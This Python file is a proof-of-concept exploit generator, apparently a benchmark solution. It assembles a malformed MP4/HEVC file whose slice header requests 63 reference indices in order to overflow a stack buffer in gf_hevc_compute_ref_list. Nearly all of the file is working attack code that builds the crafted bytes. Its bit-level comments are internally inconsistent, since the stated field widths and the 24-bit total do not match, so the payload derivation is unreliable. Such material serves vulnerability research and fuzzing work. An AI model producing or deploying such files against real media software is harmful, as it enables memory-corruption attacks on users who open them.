import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow in gf_hevc_compute_ref_list.
        The PoC creates a valid MP4 file with an HEVC track containing a malicious Slice Header.
        """

        # --- Helper Functions for MP4 Atoms ---
        def atom(name, data):
            return struct.pack(">I", len(data) + 8) + name.encode('ascii') + data

        def container(name, children):
            return atom(name, b"".join(children))

        # --- HEVC Parameter Sets (VPS, SPS, PPS) ---
        # Using minimal valid standard test vectors
        # VPS (NAL type 32)
        vps = bytes.fromhex("40010c01ffff01600000030000030000030000030073ac09")
        # SPS (NAL type 33): Main Profile, Level 3.1, 64x64, SAO enabled
        sps = bytes.fromhex("42010101600000030000030000030000030073a003c08010e596666924ca50")
        # PPS (NAL type 34): output_flag_present_flag=0, dependent_slice=0
        pps = bytes.fromhex("4401c172b44240")

        # --- hvcC Box Construction ---
        # Must match the Profile/Level in SPS
        def make_array(nal_type, nals):
            b = bytearray([0x80 | (nal_type & 0x3F)]) # completeness=1
            b += struct.pack(">H", len(nals))
            for nal in nals:
                b += struct.pack(">H", len(nal))
                b += nal
            return b

        hvcc_header = struct.pack(
            ">B B I 6B B H B B B B H H B B B B",
            1,              # configurationVersion
            1,              # general_profile_idc (Main)
            0x60000000,     # general_profile_compatibility_flags
            0,0,0,0,0,0,    # general_constraint_indicator_flags
            93,             # general_level_idc (3.1)
            0xF000,         # min_spatial_segmentation_idc (reserved)
            0xFC,           # parallelismType
            0xFD,           # chromaFormat (4:2:0)
            0xF8,           # bitDepthLumaMinus8
            0xF8,           # bitDepthChromaMinus8
            0,              # avgFrameRate
            0,              # constantFrameRate
            0,              # numTemporalLayers
            0,              # temporalIdNested
            0xFF,           # lengthSizeMinusOne (4 bytes)
            3               # numOfArrays
        )

        hvcc_data = hvcc_header + \
                    make_array(32, [vps]) + \
                    make_array(33, [sps]) + \
                    make_array(34, [pps])

        # --- Malicious Payload ---
        # NAL Unit: Slice TRAIL_R (Type 1)
        # Goal: Set num_ref_idx_l0_active_minus1 > 16 to overflow stack buffer
        # Construction logic based on bitstream parsing:
        # Header: 02 01 (Type 1, Layer 0, TID 1)
        # Bits:
        # 1       - first_slice_segment_in_pic_flag
        # 1       - slice_pic_parameter_set_id (ue(0) -> 1)
        # 010     - slice_type (ue(1) -> P)
        # 0       - slice_sao_luma_flag (present due to SPS SAO enabled)
        # 0       - slice_sao_chroma_flag
        # 0       - slice_temporal_mvp_enabled_flag (present due to SPS)
        # 1       - num_ref_idx_active_override_flag (Forces explicit list size)
        # 0000001 - num_ref_idx_l0_active_minus1 prefix (6 zeros, 1)
        # 000000  - num_ref_idx_l0_active_minus1 suffix (6 bits 0) -> Value 63
        # Total bits: 1 1 010 0 0 0 1 0000001 000000 = 24 bits
        # Hex: 
        # 11010000 -> D0
        # 10000001 -> 81
        # 00000000 -> 00
        
        nal_header = bytes.fromhex("0201")
        slice_payload = bytes.fromhex("D08100")
        
        # Total Sample Data (Length + NAL)
        sample_data = struct.pack(">I", len(nal_header) + len(slice_payload)) + nal_header + slice_payload

        # --- MP4 Structure Assembly ---
        ftyp = atom("ftyp", b"isom\0\0\0\0isomiso2mp41")

        mvhd = atom("mvhd", struct.pack(">4s 4I 2I 2I H H 2x 9I 6I",
            b"\0"*4, 0, 0, 1000, 1000, 0x00010000, 0x0100, 0, 0, 
            0x00010000,0,0, 0,0x00010000,0, 0,0,0x40000000,
            0,0,0,0,0, 2
        ))

        tkhd = atom("tkhd", struct.pack(">4s 4I 2I 2h H H 2x 9I 2I",
            b"\0\x00\x00\x01", 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,
            0x00010000,0,0, 0,0x00010000,0, 0,0,0x40000000,
            0, 0
        ))

        mdhd = atom("mdhd", struct.pack(">4s 4I 2H", b"\0"*4, 0, 0, 1000, 1000, 0, 0))
        hdlr = atom("hdlr", b"\0"*4 + b"\0"*4 + b"vide" + b"\0"*12 + b"VideoHandler\0")
        
        vmhd = atom("vmhd", b"\0"*4 + b"\0\0\0\0" + b"\0\0\0\0")
        dref = atom("dref", b"\0"*4 + struct.pack(">I", 1) + atom("url ", b"\0"*4))
        dinf = atom("dinf", dref)

        stsd = atom("stsd", b"\0"*4 + struct.pack(">I", 1) + 
                    atom("hvc1", 
                            b"\0"*6 + struct.pack(">H", 1) + b"\0"*16 + 
                            struct.pack(">H H", 64, 64) + 
                            struct.pack(">I", 0x00480000) + b"\0"*4 + b"\0"*2 + 
                            b"\0"*32 + struct.pack(">H", 24) + b"\xff\xff" + 
                            atom("hvcC", hvcc_data)
                    ))
        
        stts = atom("stts", b"\0"*4 + struct.pack(">2I", 1, 100)) 
        stsc = atom("stsc", b"\0"*4 + struct.pack(">3I", 1, 1, 1)) 
        stsz = atom("stsz", b"\0"*4 + struct.pack(">I I", 0, 1) + struct.pack(">I", len(sample_data)))
        
        # Pre-calculation of offset for stco
        # We need to construct the tree to measure it.
        # Structure: ftyp + moov (with placeholder stco) + mdat
        # mdat starts immediately after moov.
        
        # Build dummy moov to calculate size
        stco_dummy = atom("stco", b"\0"*4 + struct.pack(">2I", 1, 0))
        stbl_dummy = container("stbl", [stsd, stts, stsc, stsz, stco_dummy])
        minf_dummy = container("minf", [vmhd, dinf, stbl_dummy])
        mdia_dummy = container("mdia", [mdhd, hdlr, minf_dummy])
        trak_dummy = container("trak", [tkhd, mdia_dummy])
        moov_dummy = container("moov", [mvhd, trak_dummy])
        
        mdat_offset = len(ftyp) + len(moov_dummy) + 8 # +8 for mdat header
        
        # Build real moov
        stco = atom("stco", b"\0"*4 + struct.pack(">2I", 1, mdat_offset))
        stbl = container("stbl", [stsd, stts, stsc, stsz, stco])
        minf = container("minf", [vmhd, dinf, stbl])
        mdia = container("mdia", [mdhd, hdlr, minf])
        trak = container("trak", [tkhd, mdia])
        moov = container("moov", [mvhd, trak])

        mdat = atom("mdat", sample_data)

        return ftyp + moov + mdat